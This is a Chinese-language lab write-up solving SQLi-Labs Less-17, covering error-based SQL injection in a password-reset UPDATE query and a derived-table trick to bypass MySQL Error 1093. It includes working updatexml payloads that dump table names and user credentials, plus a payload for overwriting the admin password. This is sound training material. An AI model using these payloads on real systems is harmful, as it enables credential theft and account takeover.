【SQLi-Labs】Less-17 POST型 UPDATE 报错注入与派生表绕过 Writeup

操作者：何芊宏 | 操作日期：2026.10.24 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, POST注入, UPDATE注入, 报错注入

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-17 (POST - Update Query - Error Based - String)
  • 提示：POST请求，更新（UPDATE）查询注入，报错注入

2. 解题思路与前置原理

2.1 注入点的确定

本关卡为密码重置界面。根据后端代码逻辑，系统分为两步执行：

  1. 首先使用 SELECT 语句查询传入的 uname 是否存在。
  2. 如果存在，则执行 UPDATE users SET password='$passwd' WHERE username='$uname'。

如果在 uname 处进行注入并触发报错，会导致第一步 SELECT 失败，程序将无法执行到 UPDATE 语句。因此，注入点必须选在 passwd 字段。

2.2 UPDATE 注入与 Error 1093 限制

在 passwd 字段使用 updatexml 构造报错注入时，若直接子查询 users 表，例如：
AND updatexml(1, concat(0x7e, (select group_concat(username) from users), 0x7e), 1)

MySQL 会抛出 Error 1093: You can't specify target table 'users' for update in FROM clause。
原理：在 MySQL 中，禁止在 UPDATE 或 DELETE 某个表的同时，在子查询中直接读取该目标表。这是为了防止引擎在执行时发生自锁（Self-Deadlock）或导致数据隔离级别冲突。

2.3 派生表（Derived Table）绕过机制

为了绕过限制，需要引入派生表。语法为 FROM (SELECT ...) AS alias。

底层执行机制：MySQL 引擎在执行时，会先执行括号内的子查询，将其结果集物化（Materialization）到一张内存或磁盘的临时表中（命名为别名 t）。此时，外层查询针对的是临时表 t，而非物理表 users，从而规避了 1093 错误。

3. 操作步骤与解析

工具环境：Burp Suite（浏览器代理已配置，使用 Repeater 模块进行请求篡改）。

第一步：抓包与探测注入点

抓取 POST 请求体，将 passwd 字段的值修改为 123'：

uname=admin&passwd=123'&submit=Submit

回显现象：页面报错 You have an error in your SQL syntax... near 'admin' at line 1。

解释：输入的 123' 闭合了前端的 '$passwd'，导致后续的 WHERE username = 被解析为字符串内容，最后裸奔的 admin 触发语法错误，证明此处存在单引号字符型注入。

第二步：利用 updatexml 爆出表名

在 passwd 处闭合后使用 # 截断后续代码，使用报错函数：

uname=admin&passwd=1' AND updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 0x7e), 1) #&submit=Submit

回显现象：报错信息泄露 ~emails,referrers,uagents,users~。

第三步：利用派生表绕过限制提取数据

直接查询 users 报 1093 错误，将 Payload 修改为使用派生表：

uname=admin&passwd=1' AND updatexml(1, concat(0x7e, (select group_concat(username, 0x3a, password) from (select username, password from security.users) as t), 0x7e), 1) #&submit=Submit

回显现象：成功报错 XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'。数据因报错字符长度限制被截断，但核心账号密码已成功提取。

4. 踩坑记录与复盘

  • 注入点的逻辑判断：在带有前置校验（如查用户是否存在）的 POST 业务中，必须将注入点放在后续参与核心查询/更新的参数上（如本例的 passwd）。若在 uname 处注入，只会导致前置校验失败而无法触发真正的漏洞代码。
  • 派生表语法强制要求：FROM (SELECT ...) 后面必须跟上 AS 别名，否则 MySQL 无法区分数据源，会直接报错。

5. 知识点总结

  • UPDATE 注入：针对更新语句的注入，在实战中极其危险，最直接的利用方式是篡改管理员密码（1' WHERE username='admin' #）。
  • 派生表（Derived Table）：在 FROM 子句中使用的子查询，生成临时结果集。是 SQL 注入中解决“同表更新与查询”冲突的关键手段。
